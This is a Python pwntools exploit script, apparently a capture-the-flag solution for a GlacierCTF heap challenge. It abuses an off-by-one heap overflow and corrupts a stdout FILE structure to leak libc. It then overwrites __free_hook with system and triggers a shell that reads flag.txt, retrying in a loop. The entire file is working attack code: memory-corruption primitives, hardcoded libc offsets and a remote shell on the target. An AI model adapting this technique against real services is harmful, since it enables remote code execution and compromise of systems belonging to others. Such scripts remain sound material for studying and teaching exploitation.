from pwn import *

context.terminal = ['terminator', '-e']
#p = remote("167.235.151.78",9001)
# p = process("./a.out")
    # b * guess_add
    # b * guess_check


# pid = gdb.attach(p,gdbscript="""
#     b * change+191
# """)

def add(index,size,content):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"> ",index)
    p.sendlineafter(b"> ",size)
    p.sendlineafter(b"> ",content)

def add2(index,size,content):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"> ",index)
    p.sendlineafter(b"> ",size)
    p.sendafter(b"> ",content)

def change(index, content):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"> ",index)
    p.sendafter(b"> ",content)

def delete(index):
    p.sendlineafter(b"> ","3")
    p.sendlineafter(b"> ",index)


while True:
    #p = process("./a.out")
    # p = remote("challenges.cybernight.org",9001)
    p = remote("pwn.glacierctf.com", 13376)
    # input()
    # heap overflow primitive

    ## allocate 3 chunks for playground
    try: 
        for i in range(4):
                add(str(i),'100','A'*16)

        ## check idx 1,3 and 2

        delete('3')
        delete('2')
        delete('1')

        ## allocate on index 16, use off by one to change sizes array

        add('16','10','BBBBBBB')

        ## change chunk 1, should have a large size

        pad = 0x68 * b"X"
        pad += p64(0x71)
        change('0',pad+b'\x90\x32')


        # allocate 3 times, 3rd will come back on the file structure

        add('10','100','AAA')
        add2('11','100',b'B'*8+p64(0x1e1)+p64(0x00000000fbad2488)+b'\x70')

        print('scss ',p.recvline())
        leak = u64(p.recv(6).ljust(8,b'\0'))
        print(hex(leak))
        # libc_base = leak -0x1bff60
        # system = leak -0x177110
        # bin_sh = libc_base + 0x18a152
        # free_hook = libc_base + 0x1c1e70 
        libc_base = leak -0x1e8f60
        system = libc_base +0x000000000052290
        bin_sh = libc_base + 0x18a152
        free_hook = libc_base + 0x1eee48

        print("[+] libc_base: ", hex(libc_base))
        print("[+] libc_system: ", hex(system))
        print("[+] bin_sh: ", hex(bin_sh))
        print("[+] free_hook: ", hex(free_hook))

        delete('10')

        pad = 0x68 * b"X"
        pad += p64(0x71)
        change('0',pad+p64(free_hook))

        add('13','100','AAA')
        add('14','100',p64(system))

        add('8','10',b'/bin/sh\0')

        delete('8')

        p.sendline(b"cat flag.txt")
        a = p.recv(10000)
        print(a)
        if b"glacierctf" in a:
            break
        else:
            p.close()
            p.shutdown()
    except:
        p.close()
        p.shutdown()


p.interactive()
